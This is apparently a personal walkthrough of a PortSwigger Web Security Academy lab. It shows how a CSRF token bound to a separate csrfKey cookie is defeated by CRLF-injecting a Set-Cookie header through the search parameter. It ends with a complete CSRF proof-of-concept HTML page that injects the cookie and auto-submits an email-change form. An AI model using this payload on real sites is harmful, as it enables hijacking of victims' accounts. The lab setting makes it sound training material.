# CSRF where token is tied to non-session cookie

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

Credentials - wiener:peter, carlos:montoya

### Analysis/Exploitation -

Login as user `wiener`:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/48a33bf9-4b46-4623-b486-8713da08cf8b/2024-02-19_09-40.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WLYZ2PVO%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204626Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIC5fTycdklz2rY8YmfWGDTbBKuKjKfreAWNtanBJTKxcAiEA15ecvqTUkwiahRoHjSrpJwumAuj3XxNj5ZSvxgi%2FA2EqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGhLZgg7mTALO%2F3CdSrcAweDikPge8sHPkfLkqPbzVn3hHwttq6l%2BA8JKM5twLNUMSA7BtVWp6WdMvcGQJtDLS%2Fch0bzKPQqqUYZ%2FUK%2FqrVGWbyUboU%2BQrY8obZpjl1VXhZkwe05wh3PMu2HH4%2F11rznCbwe743L8%2FooQSXzMNqjE3fIRhQanxzPB%2BUduXxF6FeW2P%2BaV0JVy96lxqZ0DXAtUQze5zZbhUpKSO%2Fk77Ey7k6jvaXzwRztM%2F6U%2FWm6nEn9GxSyyElo912jJCTjrCDtdm1m5%2BdQGOc5R2CahtwqBrV0Q%2FT1G23ZuUkyqb%2F%2B60o%2BgDOweymTlD4ylPnJhWPsvDwYyA7j7iXd1NYaOtiPKqFhANEFnxHz5W17%2BPOY3EJdTpetCqXhW0%2B5j%2FY2rjShFFNL5bQ1IUoCksqWlzKWSTwryEfKm4p%2F3Zvb9oQX0hWaMaS873sApBzJdjzThbEoJ9tT0swpHpl3IQ2143HVipn4B8li60VyOwmywsvvhNXD13F7hoeowXeI7oAjRYenU3BCkwcGZJEKJeu1qA7f6XhPCQ8RujvnTmwaHQFToaE%2Fr0nYo9SX7mK4p%2FLrwfOc5x81nyDFJerCxJhSkxwqe%2BYrVNXbQcKCE0OTWjHI5kJNdP4iews0pQgMMKjGotQGOqUBLFMDzE93GEbdZ%2FH7iDM0Ck06wPG75Yg9eUuDV3pmDxTSSeggfsjQH9pRESQoKR2VLuZ%2Bis0uazPsG8YIrJF8gAOWQ9gLQyMcST8ZduIMMQu0UjIN%2B7%2BFQmWDua8hqWUJjy2pbQyEg2v8l6Sz%2B8y8iPUZ8PAeibgPSbIeGwhj4FoN3lWaeg8vZ8FpD7B9hRVarbfR6qH1iImKa7FUdKrCkQtSFbK%2B&X-Amz-Signature=84f0dd5d837996601936025662213f34d11701b82ea195891fb145ecec5a2ce6&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

The session cookie and the csrf-tokens are the expected parts. But there is a second cookie `csrfKey`, that looks very similar to a second session value.

All values remain static for the session. When I logout and login again as the same user, the session cookie changes (this is expected) but csrfKey and csrf-token remain the same.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/660e4e77-f387-4cc6-a69a-54867b104a3a/2024-02-19_09-47.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WLYZ2PVO%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204626Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIC5fTycdklz2rY8YmfWGDTbBKuKjKfreAWNtanBJTKxcAiEA15ecvqTUkwiahRoHjSrpJwumAuj3XxNj5ZSvxgi%2FA2EqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGhLZgg7mTALO%2F3CdSrcAweDikPge8sHPkfLkqPbzVn3hHwttq6l%2BA8JKM5twLNUMSA7BtVWp6WdMvcGQJtDLS%2Fch0bzKPQqqUYZ%2FUK%2FqrVGWbyUboU%2BQrY8obZpjl1VXhZkwe05wh3PMu2HH4%2F11rznCbwe743L8%2FooQSXzMNqjE3fIRhQanxzPB%2BUduXxF6FeW2P%2BaV0JVy96lxqZ0DXAtUQze5zZbhUpKSO%2Fk77Ey7k6jvaXzwRztM%2F6U%2FWm6nEn9GxSyyElo912jJCTjrCDtdm1m5%2BdQGOc5R2CahtwqBrV0Q%2FT1G23ZuUkyqb%2F%2B60o%2BgDOweymTlD4ylPnJhWPsvDwYyA7j7iXd1NYaOtiPKqFhANEFnxHz5W17%2BPOY3EJdTpetCqXhW0%2B5j%2FY2rjShFFNL5bQ1IUoCksqWlzKWSTwryEfKm4p%2F3Zvb9oQX0hWaMaS873sApBzJdjzThbEoJ9tT0swpHpl3IQ2143HVipn4B8li60VyOwmywsvvhNXD13F7hoeowXeI7oAjRYenU3BCkwcGZJEKJeu1qA7f6XhPCQ8RujvnTmwaHQFToaE%2Fr0nYo9SX7mK4p%2FLrwfOc5x81nyDFJerCxJhSkxwqe%2BYrVNXbQcKCE0OTWjHI5kJNdP4iews0pQgMMKjGotQGOqUBLFMDzE93GEbdZ%2FH7iDM0Ck06wPG75Yg9eUuDV3pmDxTSSeggfsjQH9pRESQoKR2VLuZ%2Bis0uazPsG8YIrJF8gAOWQ9gLQyMcST8ZduIMMQu0UjIN%2B7%2BFQmWDua8hqWUJjy2pbQyEg2v8l6Sz%2B8y8iPUZ8PAeibgPSbIeGwhj4FoN3lWaeg8vZ8FpD7B9hRVarbfR6qH1iImKa7FUdKrCkQtSFbK%2B&X-Amz-Signature=fcdee950db60b4a75789ddbb117f107478ba2d0c99c8f4b563f8e47a490567bd&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

This indicates that the system providing the CSRF protection does not integrate into the session system, but creates its own type of session that is not in sync. This might violate the **tightly connected** property mentioned earlier.

> 💡 **Testing CSRF Tokens and CSRF cookies:**

  1. Check if the CSRF token is tied to the CSRF cookie
    - Submit an invalid CSRF token
    - Submit a valid CSRF token from another user
—>we get error and it concludes CSRF token may be tied to session or csrfKey cookie

  1. Submit both valid CSRF token and cookie from another user
—>we get 302 response and it concludes CSRF token is tied to csrfKey cookie

**In order to exploit this vulnerability, we need to perform 2 things:**

  1. Inject a csrfKey cookie in the user's session (HTTP Header injection) - satisfied
  1. Send a CSRF attack to the victim with a known csrf token
Login as user `carlos` in incognito:

Submit the "Update email" form, and intercept the resulting request.

**use  the session ID from the current **`carlos`**session, but both **`csrfKey`** as well ass **`csrf`**-token from user **`wiener`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/c193d7c0-226f-4233-af37-70b28ae92d9c/2024-02-19_09-54.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WLYZ2PVO%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204626Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIC5fTycdklz2rY8YmfWGDTbBKuKjKfreAWNtanBJTKxcAiEA15ecvqTUkwiahRoHjSrpJwumAuj3XxNj5ZSvxgi%2FA2EqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGhLZgg7mTALO%2F3CdSrcAweDikPge8sHPkfLkqPbzVn3hHwttq6l%2BA8JKM5twLNUMSA7BtVWp6WdMvcGQJtDLS%2Fch0bzKPQqqUYZ%2FUK%2FqrVGWbyUboU%2BQrY8obZpjl1VXhZkwe05wh3PMu2HH4%2F11rznCbwe743L8%2FooQSXzMNqjE3fIRhQanxzPB%2BUduXxF6FeW2P%2BaV0JVy96lxqZ0DXAtUQze5zZbhUpKSO%2Fk77Ey7k6jvaXzwRztM%2F6U%2FWm6nEn9GxSyyElo912jJCTjrCDtdm1m5%2BdQGOc5R2CahtwqBrV0Q%2FT1G23ZuUkyqb%2F%2B60o%2BgDOweymTlD4ylPnJhWPsvDwYyA7j7iXd1NYaOtiPKqFhANEFnxHz5W17%2BPOY3EJdTpetCqXhW0%2B5j%2FY2rjShFFNL5bQ1IUoCksqWlzKWSTwryEfKm4p%2F3Zvb9oQX0hWaMaS873sApBzJdjzThbEoJ9tT0swpHpl3IQ2143HVipn4B8li60VyOwmywsvvhNXD13F7hoeowXeI7oAjRYenU3BCkwcGZJEKJeu1qA7f6XhPCQ8RujvnTmwaHQFToaE%2Fr0nYo9SX7mK4p%2FLrwfOc5x81nyDFJerCxJhSkxwqe%2BYrVNXbQcKCE0OTWjHI5kJNdP4iews0pQgMMKjGotQGOqUBLFMDzE93GEbdZ%2FH7iDM0Ck06wPG75Yg9eUuDV3pmDxTSSeggfsjQH9pRESQoKR2VLuZ%2Bis0uazPsG8YIrJF8gAOWQ9gLQyMcST8ZduIMMQu0UjIN%2B7%2BFQmWDua8hqWUJjy2pbQyEg2v8l6Sz%2B8y8iPUZ8PAeibgPSbIeGwhj4FoN3lWaeg8vZ8FpD7B9hRVarbfR6qH1iImKa7FUdKrCkQtSFbK%2B&X-Amz-Signature=a43740c5c120cb33098f1b21c12af7e62f1f9d8b848df69221b35e7bbf3e3fcf&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

the request goes through and carlos email get changed:

I can change a victims email with my own CSRF-data. Including the csrf-token in the malicious HTML form is easy, but the `csrfKey` is taken from the cookie as **the **`csrfKey`** is a cookie**! And we couldn’t simply add our own cookie value. So the next step is to find a way to manipulate the cookie values.

**When we click the **`Search`** button, it’ll send a GET request to **`/`** with the parameter **`search`**.**

**Also, when we sent the request, it’ll set a new cookie value: **`LastSearchTerm=<seach_parameter_value>`**!**

So with it we can set any cookie value as we wanted.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/9e4f597b-c136-4cde-8a1f-e406f9b8c932/2024-02-19_10-00.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WLYZ2PVO%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204626Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIC5fTycdklz2rY8YmfWGDTbBKuKjKfreAWNtanBJTKxcAiEA15ecvqTUkwiahRoHjSrpJwumAuj3XxNj5ZSvxgi%2FA2EqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGhLZgg7mTALO%2F3CdSrcAweDikPge8sHPkfLkqPbzVn3hHwttq6l%2BA8JKM5twLNUMSA7BtVWp6WdMvcGQJtDLS%2Fch0bzKPQqqUYZ%2FUK%2FqrVGWbyUboU%2BQrY8obZpjl1VXhZkwe05wh3PMu2HH4%2F11rznCbwe743L8%2FooQSXzMNqjE3fIRhQanxzPB%2BUduXxF6FeW2P%2BaV0JVy96lxqZ0DXAtUQze5zZbhUpKSO%2Fk77Ey7k6jvaXzwRztM%2F6U%2FWm6nEn9GxSyyElo912jJCTjrCDtdm1m5%2BdQGOc5R2CahtwqBrV0Q%2FT1G23ZuUkyqb%2F%2B60o%2BgDOweymTlD4ylPnJhWPsvDwYyA7j7iXd1NYaOtiPKqFhANEFnxHz5W17%2BPOY3EJdTpetCqXhW0%2B5j%2FY2rjShFFNL5bQ1IUoCksqWlzKWSTwryEfKm4p%2F3Zvb9oQX0hWaMaS873sApBzJdjzThbEoJ9tT0swpHpl3IQ2143HVipn4B8li60VyOwmywsvvhNXD13F7hoeowXeI7oAjRYenU3BCkwcGZJEKJeu1qA7f6XhPCQ8RujvnTmwaHQFToaE%2Fr0nYo9SX7mK4p%2FLrwfOc5x81nyDFJerCxJhSkxwqe%2BYrVNXbQcKCE0OTWjHI5kJNdP4iews0pQgMMKjGotQGOqUBLFMDzE93GEbdZ%2FH7iDM0Ck06wPG75Yg9eUuDV3pmDxTSSeggfsjQH9pRESQoKR2VLuZ%2Bis0uazPsG8YIrJF8gAOWQ9gLQyMcST8ZduIMMQu0UjIN%2B7%2BFQmWDua8hqWUJjy2pbQyEg2v8l6Sz%2B8y8iPUZ8PAeibgPSbIeGwhj4FoN3lWaeg8vZ8FpD7B9hRVarbfR6qH1iImKa7FUdKrCkQtSFbK%2B&X-Amz-Signature=60379e0f5bafa1abf6238d302bd1e2425a23bb15205cbf0d982dbd5f0798a540&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**In **[**Mozilla web docs**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)**, it said:**

> To send multiple cookies, multiple Set-Cookie headers should be sent in the same response.

**After I google this a little bit, I found this **[**Medium blog**](https://medium.com/@protostar0/crlf-injection-allow-cookie-injection-in-root-domain-xss-812cd807ba5b)**: which says CRLF injection allow cookie injection?**

**And after googled about CRLF injection, I found this post on **[**GeeksforGeeks**](https://www.geeksforgeeks.org/crlf-injection-attack/)

- `\r`** (Carriage Return)** → moves the cursor to the beginning of the line without advancing to the next line
- `\n`** (Line Feed)** → moves the cursor down to the next line without returning to the beginning of the line
**So if the web application is vulnerable, we can inject **`%0d%0a`** (**`\r\n`**) in the request**

Note: The `%3b%20` means `; `, and we need `SameSite` is set to `None`.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/85df3058-0706-4239-9d26-27f80ae15a72/2024-02-19_10-05.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WLYZ2PVO%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204626Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIC5fTycdklz2rY8YmfWGDTbBKuKjKfreAWNtanBJTKxcAiEA15ecvqTUkwiahRoHjSrpJwumAuj3XxNj5ZSvxgi%2FA2EqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGhLZgg7mTALO%2F3CdSrcAweDikPge8sHPkfLkqPbzVn3hHwttq6l%2BA8JKM5twLNUMSA7BtVWp6WdMvcGQJtDLS%2Fch0bzKPQqqUYZ%2FUK%2FqrVGWbyUboU%2BQrY8obZpjl1VXhZkwe05wh3PMu2HH4%2F11rznCbwe743L8%2FooQSXzMNqjE3fIRhQanxzPB%2BUduXxF6FeW2P%2BaV0JVy96lxqZ0DXAtUQze5zZbhUpKSO%2Fk77Ey7k6jvaXzwRztM%2F6U%2FWm6nEn9GxSyyElo912jJCTjrCDtdm1m5%2BdQGOc5R2CahtwqBrV0Q%2FT1G23ZuUkyqb%2F%2B60o%2BgDOweymTlD4ylPnJhWPsvDwYyA7j7iXd1NYaOtiPKqFhANEFnxHz5W17%2BPOY3EJdTpetCqXhW0%2B5j%2FY2rjShFFNL5bQ1IUoCksqWlzKWSTwryEfKm4p%2F3Zvb9oQX0hWaMaS873sApBzJdjzThbEoJ9tT0swpHpl3IQ2143HVipn4B8li60VyOwmywsvvhNXD13F7hoeowXeI7oAjRYenU3BCkwcGZJEKJeu1qA7f6XhPCQ8RujvnTmwaHQFToaE%2Fr0nYo9SX7mK4p%2FLrwfOc5x81nyDFJerCxJhSkxwqe%2BYrVNXbQcKCE0OTWjHI5kJNdP4iews0pQgMMKjGotQGOqUBLFMDzE93GEbdZ%2FH7iDM0Ck06wPG75Yg9eUuDV3pmDxTSSeggfsjQH9pRESQoKR2VLuZ%2Bis0uazPsG8YIrJF8gAOWQ9gLQyMcST8ZduIMMQu0UjIN%2B7%2BFQmWDua8hqWUJjy2pbQyEg2v8l6Sz%2B8y8iPUZ8PAeibgPSbIeGwhj4FoN3lWaeg8vZ8FpD7B9hRVarbfR6qH1iImKa7FUdKrCkQtSFbK%2B&X-Amz-Signature=984387c9a0fea6d472006d469493e5d95bf61e94fa4ffe16d2c72184732ffdb7&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

generate csrf poc

Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:

```text
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.form
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/39a7df58-e6fb-4bcf-9624-13ebea3239b0/2024-02-20_15-21.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WLYZ2PVO%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204626Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIC5fTycdklz2rY8YmfWGDTbBKuKjKfreAWNtanBJTKxcAiEA15ecvqTUkwiahRoHjSrpJwumAuj3XxNj5ZSvxgi%2FA2EqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGhLZgg7mTALO%2F3CdSrcAweDikPge8sHPkfLkqPbzVn3hHwttq6l%2BA8JKM5twLNUMSA7BtVWp6WdMvcGQJtDLS%2Fch0bzKPQqqUYZ%2FUK%2FqrVGWbyUboU%2BQrY8obZpjl1VXhZkwe05wh3PMu2HH4%2F11rznCbwe743L8%2FooQSXzMNqjE3fIRhQanxzPB%2BUduXxF6FeW2P%2BaV0JVy96lxqZ0DXAtUQze5zZbhUpKSO%2Fk77Ey7k6jvaXzwRztM%2F6U%2FWm6nEn9GxSyyElo912jJCTjrCDtdm1m5%2BdQGOc5R2CahtwqBrV0Q%2FT1G23ZuUkyqb%2F%2B60o%2BgDOweymTlD4ylPnJhWPsvDwYyA7j7iXd1NYaOtiPKqFhANEFnxHz5W17%2BPOY3EJdTpetCqXhW0%2B5j%2FY2rjShFFNL5bQ1IUoCksqWlzKWSTwryEfKm4p%2F3Zvb9oQX0hWaMaS873sApBzJdjzThbEoJ9tT0swpHpl3IQ2143HVipn4B8li60VyOwmywsvvhNXD13F7hoeowXeI7oAjRYenU3BCkwcGZJEKJeu1qA7f6XhPCQ8RujvnTmwaHQFToaE%2Fr0nYo9SX7mK4p%2FLrwfOc5x81nyDFJerCxJhSkxwqe%2BYrVNXbQcKCE0OTWjHI5kJNdP4iews0pQgMMKjGotQGOqUBLFMDzE93GEbdZ%2FH7iDM0Ck06wPG75Yg9eUuDV3pmDxTSSeggfsjQH9pRESQoKR2VLuZ%2Bis0uazPsG8YIrJF8gAOWQ9gLQyMcST8ZduIMMQu0UjIN%2B7%2BFQmWDua8hqWUJjy2pbQyEg2v8l6Sz%2B8y8iPUZ8PAeibgPSbIeGwhj4FoN3lWaeg8vZ8FpD7B9hRVarbfR6qH1iImKa7FUdKrCkQtSFbK%2B&X-Amz-Signature=727921d7c692b5f374dbf0cf00e7948d1f644c0a7bc628a5b60da56a44d2400e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1800d3045ae7ed82e29854004c006f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;domain&#46;com" />
      <input type="hidden" name="csrf" value="GDejMnJlFfCIXtNUq4fiUPAZwU3ew3dQ" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a1800d3045ae7ed82e29854004c006f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=EI5tQ8UWhMoPUcfJk0ulcN7mRnPhkcaC%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

